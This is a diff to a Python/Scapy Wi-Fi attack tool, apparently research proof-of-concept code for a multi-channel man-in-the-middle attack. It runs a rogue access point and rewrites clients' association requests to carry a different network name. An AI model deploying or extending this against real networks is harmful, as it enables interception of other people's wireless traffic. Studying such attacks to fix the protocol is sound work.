@@ -6,6 +6,11 @@
 #from scapy.layers.dot11 import Dot11Elt, Dot11EltRates, Dot11EltDSSSet, Dot11Beacon
 from scapy.layers.dot11 import Dot11Elt
 
+TRUSTED_NET = "goodnetwork"
+WRONG_NET = "badnetwork"
+TEST_OPTIMIZED_ATTACK = False # See Section 4.2 "Optimized Connection-Only Attack"
+
+
 # --- PERFORMANCE REMARKS ---
 #
 # We use BFP packet filers so that only relevant Wi-Fi frames reach our script. Otherwise
@@ -171,10 +176,9 @@ def dot11_to_str(p):
 		if p.subtype == 4:       return "Null(seq=%d, sleep=%d)" % (dot11_get_seqnum(p), p.FCfield & 0x10 != 0)
 		if p.subtype == 12:      return "QoS-Null(seq=%d, sleep=%d)" % (dot11_get_seqnum(p), p.FCfield & 0x10 != 0)
 		if EAPOL in p:
-			# elif EAP in p:   return "EAP-%s,%s(seq=%d)" % (dict_or_str(EAP_CODE, p[EAP].code), dict_or_str(EAP_TYPE, p[EAP].type), dot11_get_seqnum(p))
-			 return str(repr(p))
-			# elif get_eapol_msgnum(p) != 0:return "EAPOL-Msg%d(seq=%d, replay=%d)" % (get_eapol_msgnum(p), dot11_get_seqnum(p), get_eapol_replaynum(p))
-			# else:            return croprepr(p)
+			if get_eapol_msgnum(p) != 0: return "EAPOL-Msg%d(seq=%d, replay=%d)" % (get_eapol_msgnum(p), dot11_get_seqnum(p), get_eapol_replaynum(p))
+			elif EAP in p:   return "EAP-%s,%s(seq=%d)" % (dict_or_str(EAP_CODE, p[EAP].code), dict_or_str(EAP_TYPE, p[EAP].type), dot11_get_seqnum(p))
+			else:            return croprepr(p)
 	return croprepr(p)
 
 
@@ -288,7 +292,7 @@ class ClientState():
 		"""
 		if p.type == 0 and p.subtype == 0:
 			# Modifying association requests.
-			new_ssid = Dot11Elt(ID='SSID', info="badnetwork", len=10)
+			new_ssid = Dot11Elt(ID='SSID', info=WRONG_NET, len=len(WRONG_NET))
 			p[Dot11Elt] = new_ssid / p[Dot11EltRates]
 		return p
 
@@ -563,7 +567,7 @@ class McMitm():
 					print_rx(INFO, "Rogue channel", p, suffix=" -- MitM'ing")
 					client.mark_got_mitm()
 				else:
-					if is_last_packet(p):
+					if TEST_OPTIMIZED_ATTACK and is_last_packet(p):
 						# restart the ap with the old beacon instead of the modified one.
 						stop_ap(self.nic_rogue_ap)
 						self.beacon = self.old_beacon.copy()
